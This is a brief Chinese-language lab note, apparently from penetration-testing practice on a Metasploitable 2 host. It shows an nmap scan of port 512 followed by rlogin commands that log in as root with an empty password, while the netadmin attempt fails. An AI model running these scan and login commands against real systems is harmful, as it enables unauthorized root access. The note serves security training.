# 512_rlogin

nmap扫描

>  nmap -v -p 512 -T4 --version-all --script all 10.10.10.6

![image-20210318231041369](../../image/meteaspolitale2/image-20210318231041369.png)

得到可rlogin的用户名单

用root登录

> rlogin -l root 10.10.10.6

![image-20210318231132787](../../image/meteaspolitale2/image-20210318231132787.png)

登录成功

其他用户

> rlogin -l netadmin 10.10.10.6

![image-20210318231359560](C:/Users/Cite-Arkssac/AppData/Roaming/Typora/typora-user-images/image-20210318231359560.png)

登录失败

因为root是空密码所以可以直接登录成功

